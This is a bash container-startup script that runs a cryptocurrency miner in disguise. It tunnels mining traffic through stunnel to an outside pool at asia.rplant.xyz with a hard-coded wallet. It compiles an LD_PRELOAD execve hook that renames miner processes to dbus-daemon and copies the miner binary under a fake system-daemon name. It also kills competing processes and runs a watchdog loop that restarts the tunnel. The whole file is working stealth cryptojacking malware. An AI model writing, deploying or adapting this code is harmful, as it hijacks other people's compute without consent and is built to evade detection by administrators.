#!/bin/bash

set -euo pipefail

LOG_FILE="/tmp/miner-run.log"
PROXY_PORT=11443

echo "=== CONTAINER STARTED === $(date)" | tee -a "$LOG_FILE"

# Aggressive Cleanup
echo "[*] Cleaning old processes..." | tee -a "$LOG_FILE"
pkill -9 -f stunnel4 || true
pkill -9 -f miner || true
pkill -9 -f dbus-daemon || true
fuser -k ${PROXY_PORT}/tcp || true 2>/dev/null

# Stunnel TLS Tunnel
cat > /tmp/stunnel.conf << EOF
pid = /tmp/stunnel.pid
output = /tmp/stunnel.log
debug = 3
[mining-proxy]
client = yes
accept = 127.0.0.1:${PROXY_PORT}
connect = asia.rplant.xyz:17059
verifyChain = no
EOF

echo "[+] Starting stunnel TLS tunnel..." | tee -a "$LOG_FILE"
stunnel4 /tmp/stunnel.conf

sleep 5

# LD_PRELOAD Stealth Library
cat > /tmp/hide.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
int execve(const char *filename, char *const argv[], char *const envp[]) {
    static int (*real_execve)(const char *, char *const [], char *const []) = NULL;
    if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");
    if (filename && (strstr(filename, "miner") || (argv[0] && strstr(argv[0], "miner")))) {
        argv[0] = "/usr/bin/dbus-daemon";
    }
    return real_execve(filename, argv, envp);
}
EOF

gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>/dev/null || true

# Prepare fake binary
FAKE_PATH="/usr/local/bin/dbus-daemon-system"
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

echo "[+] Launching SUPER STEALTH miner..." | tee -a "$LOG_FILE"

if [ -f /tmp/hide.so ]; then
    echo "[+] LD_PRELOAD active" | tee -a "$LOG_FILE"
    LD_PRELOAD=/tmp/hide.so exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcp://127.0.0.1:${PROXY_PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 1 \
      -B --no-color >> "$LOG_FILE" 2>&1 &
else
    exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcp://127.0.0.1:${PROXY_PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 1 \
      -B --no-color >> "$LOG_FILE" 2>&1 &
fi

echo "[+] Miner launched. Monitoring active..." | tee -a "$LOG_FILE"

while true; do
    sleep 60
    if ! nc -z 127.0.0.1 ${PROXY_PORT} 2>/dev/null; then
        echo "[!] Stunnel down, restarting..." | tee -a "$LOG_FILE"
        pkill -9 -f stunnel4 || true
        stunnel4 /tmp/stunnel.conf
        sleep 3
    fi
done
